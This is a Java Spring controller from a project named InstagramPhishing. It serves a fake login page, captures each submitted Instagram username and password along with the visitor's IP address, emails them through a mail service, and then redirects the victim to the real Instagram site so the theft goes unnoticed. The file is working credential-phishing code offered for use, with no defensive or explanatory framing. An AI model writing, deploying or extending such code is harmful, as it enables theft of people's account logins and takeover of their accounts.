package com.kafeel.InstagramPhishing.Controller;


import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.servlet.ModelAndView;

import com.kafeel.InstagramPhishing.service.MailService;


@Controller
public class MainController {
	
	@Autowired
	MailService emailService;
	
	@RequestMapping("/")
	public String login() {
		return "login.html";
	}
	
	@RequestMapping("/instagram")
	public ModelAndView instagram(@RequestParam String username,@RequestParam String password,HttpServletRequest request
			,HttpServletResponse response) {
		
		String text = "Username : "+username
				+ "\nPassword : "+password
				+ "\nIP Address : "+request.getRemoteAddr();
		System.out.println(text);
		
		emailService.sendMail(text);
		return new ModelAndView("redirect:"+"https://www.instagram.com/");
	}
}
